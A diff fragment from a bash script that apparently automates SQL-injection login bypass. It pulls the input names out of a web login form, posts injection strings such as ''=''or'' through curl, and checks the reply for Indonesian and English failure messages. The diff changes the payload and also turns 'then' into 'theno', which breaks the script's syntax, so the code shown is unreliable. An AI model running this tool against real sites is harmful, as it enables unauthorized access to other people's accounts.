@@ -652,13 +652,13 @@ param=$(echo $ng | grep -Po '(<input).*?(>)' | grep -Po 'name="[^"]*' | cut -d '
 param1=$(echo ${param} | awk -F "," '{print $1}')
 param2=$(echo ${param} | awk -F "," '{print $2}')
 if echo "$xploit" | grep -Po "@gmail" >/dev/null;then
-   postdata="$param1=$xploit&$param2='=''or'@gmail.com$value"
+   postdata="$param1=$xploit&$param2='=''or'$value"
 else
    postdata="$param1=$xploit&$param2=$xploit$value"
 fi
 cek=$(curl -s -L -X POST "${post}" -d "${postdata}")
 if echo "$cek" | grep -Po "User|user|password|Password|Username|username|email|Email|salah|Salah|Gagal|coba|gagal|wrong|Wrong|Invalid|IncorectError|405|error" >/dev/null
- then
+ theno
    echo -e "${R}Gagal login dengan  : ${O}$xploit"
    echo -e "${P}Post data: $post -d "$postdata"${N}\n"
  else
